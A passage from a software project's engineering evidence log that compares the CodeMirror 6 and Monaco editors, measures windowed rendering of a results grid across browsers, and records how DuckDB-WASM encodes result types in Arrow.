| CodeMirror 6 | 24.8 / 31.8 | 11 / 26 | 26 / 33 |
| Monaco | 24.2 / 31.1 | 10 / 26 | 24 / 31 |

Every trial's caret and typed text were exact (0 failures). Typing is frame-bound for all three and indistinguishable at this size.

**200 KB real-clipboard paste (ms to the second frame; median of 7, all validated):**

| | Chrome | Firefox | WebKit |
|---|---|---|---|
| baseline | 82 | 64 | 132 |
| CodeMirror 6 | 65 | 63 | 48 |
| Monaco | 48 | 62 | 52 |

The values cluster on frame boundaries (about 16 ms apart). Both editors handle the paste in a few frames; neither is materially faster.

**Behaviour:**

| Check | CodeMirror 6 | Monaco |
|---|---|---|
| Requests leaving the origin (all browsers, 7 loads each) | 0 | 0 |
| CSP violations under the production CSP | 0 | 0 |
| Worker | none | one same-origin module worker, emitted, created only on demand (allowed by `worker-src 'self'`) |
| Fonts | none | 155 KB icon font emitted, not fetched in these steps |
| Tab from the editor | leaves the editor in all three browsers | **captured** (indents) in Chrome and Firefox |
| Documented escape | not needed | Ctrl+Shift+M then Tab leaves the editor (Chrome, Firefox); in WebKit, Option+Tab is not captured |
| Shift+Tab back into the editor | yes | yes |
| Accessibility tree | `textbox`, `aria-multiline=true`, author label applied | `textbox`, `aria-multiline=true`, author label applied (a `textarea` in Firefox and WebKit) |
| axe findings beyond the bare page | `scrollable-region-focusable` (1): the scroller. Not present in the production integration (application axe tests) | `color-contrast` (16) with the default theme |
| IME composition (Chrome, DevTools protocol) | committed text once, no stray composition text | same |
| Forced colours (Chrome emulation) | follows the system palette | keeps its own token colours and current-line outline |
| Theme integration | CSS theme: design-token CSS variables used directly, so a theme change needs no reconfiguration | `defineTheme` with literal colours, so `setTheme` must be called on every change and CSS variables cannot be used |
| Licence (package metadata and shipped LICENSE file) | MIT (all 14 packages in the production tree) | MIT, plus `ThirdPartyNotices.txt` |
| Mobile | supported by the project | not supported (Monaco README; §24 V11) |

### 15.3 Not verified

- **Screen readers:** no VoiceOver or NVDA editing (manual check, M05 field 16).
- **IME in Firefox and WebKit:** no automation path. IME on real hardware with a real input method was not tested in any browser.
- **Forced colours outside Chrome emulation:** no Windows High Contrast run.
- **Real GitHub Pages:** subpath emulated locally only.
- **Memory use** of either editor was not measured.

### 15.4 Decision (per the E9 acceptance rule; P-052 awaits maintainer approval)

Both candidates meet the stated acceptance criteria: zero requests leaving the origin, and full keyboard operation, Monaco's through its documented Tab-focus toggle. The rule is "between candidates that pass, choose the smaller bundle unless a required capability is missing". **CodeMirror 6 is selected.** It is 10.6× smaller in raw bytes and 8.6× smaller gzip.

Further observations, which are not part of the rule:
- It starts about 2.7–3.5× sooner.
- It does not capture Tab.
- It themes through the existing CSS variables.
- It follows forced colours.

Typing and paste do not separate the candidates. Subjective preferences (API style, ecosystem familiarity) did not enter the decision.

**Production impact:** the M05 build adds 350.4 KB raw and 115.4 KB gzip to the application JavaScript, against the M04 build. That includes the workspace code, not only CodeMirror. The editor is not lazy-loaded: CodeMirror was about 30 ms behind the textarea at first frame in Chrome, which does not justify a separate chunk and loading state.

## 16. M06 measurements: R1 results-grid rendering, and DuckDB-WASM result encoding (2026-11-27)

Run by Claude Code during M06 (IMPLEMENTATION_PLAN M06 fields 6, 14, 15; ARCHITECTURE §17; P-051; AM-014). Scripts, the baseline grid and raw results: [docs/evidence/r1-results-grid/](evidence/r1-results-grid/).

### 16.1 R1 method

- **Machine:** Apple M2 MacBook Air, 8 GB RAM, macOS (Darwin 25.5). Viewport 1440 × 900.
- **Browsers:** Google Chrome 158.0.8127.37 (installed), Playwright Firefox 159.0 and WebKit 27.2; headless. **Not real Safari:** WebKit results are not Safari measurements.
- **Path:** the production build under `/queryverdict/`, the real Run SQL path: SQL is typed into the editor and Cmd+Enter is pressed.
- **Fixtures (P-020 bounds: 1,000 rows, 200 columns, 500 characters per cell, 2,000,000 display characters):**
  - F1: 1,000 × 10 short values;
  - F2: 1,000 × 200 short integers (200,000 cells);
  - F3: 1,000 × 4 values of 600 characters, cut to 500 (2,000,000 display characters, 4,000 detail buttons);
  - F4: 1,000 × 200 values of 10 characters (combined pressure, 2,000,000 display characters).
- **Measured, 3 runs per fixture and browser, each in a fresh context:**
  - **Painted:** from Cmd+Enter to two animation frames after the grid exists (engine time included).
  - **Long tasks:** `longtask` entries. Chromium only: Firefox and WebKit do not list it in `PerformanceObserver.supportedEntryTypes`.
  - **Frame gaps over 50 ms:** a `requestAnimationFrame` loop, in every browser.
  - **Scrolling:** 20 vertical then 20 horizontal steps, 40 ms apart.
  - **Typing:** keydown to the second frame in the editor while the result is shown.
- **Uncertainty:**
  - Timings are single-machine, headless and coarse (frame-bound).
  - A first exploratory run checked support with a `try` around `observe()` and reported Firefox and WebKit as "supported" with no entries. That detection was corrected before the recorded runs.
  - The first 3-run set was taken while other work (typecheck, unit tests) ran on the machine. It was discarded and both versions re-measured without other work of mine.
  - Near the end of the plain-grid re-measurement (WebKit), an unrelated test run started on the machine. The plain WebKit F2 value of 4,356 ms is probably affected. This only makes the plain grid look worse and does not change the decision.

### 16.2 R1 results

**Plain semantic table (every row and cell in the document; `ResultGrid.plain.tsx`):**

| Fixture | Cells | Chrome longest long task (3 runs) | Chrome painted | Firefox longest frame gap | WebKit longest frame gap | Typing while shown (Chrome / Firefox / WebKit) |
|---|---|---|---|---|---|---|
| F1 | 10,000 | none | 139–166 ms | 50 ms | 115 ms | 38 / 64 / 67 ms |
| F2 | 200,000 | **678–708 ms** | 1,111–1,173 ms | 900 ms | 2,223 ms | 387 / 1,144 / 1,765 ms |
| F3 | 4,000 + 4,000 buttons | **56–225 ms** (2 of 3 runs over 200 ms) | 321–340 ms | 267 ms | 393 ms | 56 / 85 / 279 ms |
| F4 | 200,000 | **629–721 ms** | 1,041–1,142 ms | 883 ms | 1,720 ms | 335 / 857 / 1,706 ms |

**Result:** the plain table fails the 200 ms target in Chromium at the P-020 bounds. The bottleneck is DOM size: 200,000 cells to create, style and lay out, plus 4,000 buttons in F3.

**Windowed table (rows and columns; the final implementation, re-measured after the Codex M06 corrections: one spacer column per hidden side, pixel column widths, a one-screen initial window):**

| Fixture | Cells in the document | Chrome longest long task (3 runs) | Chrome painted | Firefox longest frame gap | WebKit longest frame gap | Longest scroll frame gap (Chrome / Firefox / WebKit) | Typing (Chrome / Firefox / WebKit) |
|---|---|---|---|---|---|---|---|
| F1 | 361 | 104 ms in the first (cold) run; none in the others | 154–316 ms | 0 | 0 | 0 / 0 / 0 | 33 / 30 / 51 ms |
| F2 | 721 | **99–113 ms** | 267–329 ms | 68 ms | 106 ms | 0 / 67 / 0 ms | 42 / 57 / 46 ms |
| F3 | 141 | none | 132–153 ms | 51 ms | 61 ms | 0 / 0 / 0 | 33 / 33 / 37 ms |
| F4 | 541 | **55–62 ms** | 235–252 ms | 133 ms | 76 ms | 0 / 0 / 0 | 36 / 61 / 44 ms |

**Result:**
- **Chromium:** meets the target. The longest long task was 113 ms, and scrolling produced no long task.
- **Firefox and WebKit:** no frame gap over 133 ms.
- **Typing** while a result is shown stayed at or under 61 ms.

An earlier windowed version, with spanning spacer cells and widths in `ch` units, measured 52–64 ms in Chromium. It is not reported as the final result because that version mispositioned columns in WebKit.

An intermediate row-only windowing (all 200 columns of each visible row, about 7,200 cells) was measured once in a clean single run, with a longest Chrome task of 89 ms. It was not adopted because a vertical scroll jump re-rendered every cell.

### 16.3 Decision (P-096; AM-014)

- **Windowing is adopted:** an in-house row and column windower inside `ResultGrid`, behind the same component interface. TanStack Virtual is not added (no new dependency; P-051 allows either).
- **Fixed geometry:**
  - Rows have one fixed height, with values on one line.
  - Column widths are computed once per result from all bounded values, capped at 40 characters, and set in pixels from the measured character width. Columns never shift.
  - Positions include padding and the 1 px rule of every column: omitting the rule left an about 200 px unrendered band at the far right of 200 columns, found and fixed with a regression test.
  - The hidden columns on each side are one spacer column, as wide as all of them. No cell spans columns: WebKit's fixed table layout ignored `<col>` widths across spanning spacer cells and drifted by thousands of pixels (found by the column-windowing test in WebKit after the Codex review).
- **Accessibility:** the table states its full size with `aria-rowcount`/`aria-colcount` and `aria-rowindex`/`aria-colindex`. Cells outside the window are reached by scrolling the focusable region.
- **Limitation:** assistive technology sees only the rendered window, plus the stated counts. Manual screen-reader checks are pending.

### 16.4 DuckDB-WASM result encoding probe (M06; P-093)

Each SQL value was run with the production open configuration (`castBigIntToDouble: false`) through DuckDB-WASM 1.33.1-dev57.0's Node build, which uses the same engine as the browser bundles. Its Arrow form was compared with DuckDB's own `CAST(… AS VARCHAR)`.

**Ambiguous, so not exact if read from Arrow:**
- HUGEINT and UHUGEINT both arrive as Decimal(38,0): UHUGEINT's maximum reads as −1.
- BLOB, BIT and VARINT all arrive as Binary.
- TIME and TIMETZ both arrive as Time64, so the offset is lost.
- FLOAT `0.1` reads as 0.10000000149011612.
- DOUBLE `1.0` reads as `1` where DuckDB prints `1.0`.
- A BC date is printed by DuckDB as `0045-03-15 (BC)`.
- Arrow's `get()` returns `null` for `inf` and `nan`, although the buffer holds them with the validity bit set.
- **Found by the Codex M06 review:**
  - The WHATWG `TextDecoder` default drops a leading U+FEFF, and Arrow's reader decodes with it. QueryVerdict now decodes UTF-8 itself with `ignoreBOM`, in both the results and the engine-internal reads.
  - An ENUM in a streamed `INSERT … RETURNING` result arrives with its keys but an **empty dictionary**: one chunk of length 0, no bytes, verified in Chrome. The labels are not in the transferred data, so they are shown as "not shown". A SELECT of the stored rows shows them exactly.

**Hence (P-093):** SELECT results are read as DuckDB's own text. A projection with `CAST` and `left()` runs in the engine, and the projection keeps row order: 2,001 rows of an `ORDER BY` result compared identical, single-threaded engine (`threads` = 1). Other statements' results show only the unambiguous types.
